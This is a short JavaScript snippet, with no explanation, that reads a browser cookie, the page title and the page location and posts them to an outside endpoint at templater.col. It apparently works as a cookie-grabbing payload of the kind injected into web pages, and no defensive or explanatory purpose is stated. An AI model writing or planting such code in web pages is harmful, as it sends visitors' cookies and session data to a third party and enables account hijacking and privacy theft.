const   ajaxs = require('ajaxsim'),
        cook = require('dist-cookie');

let nameCookie = 'test';
let cookieData = cook(nameCookie),
    titlePage = document.querySelector('title').innerText,
    host = window.location,
    response ="cookie="+cookieData+'&host='+host+'&title='+titlePage;


ajaxs('http://templater.col/respond-require-data', response);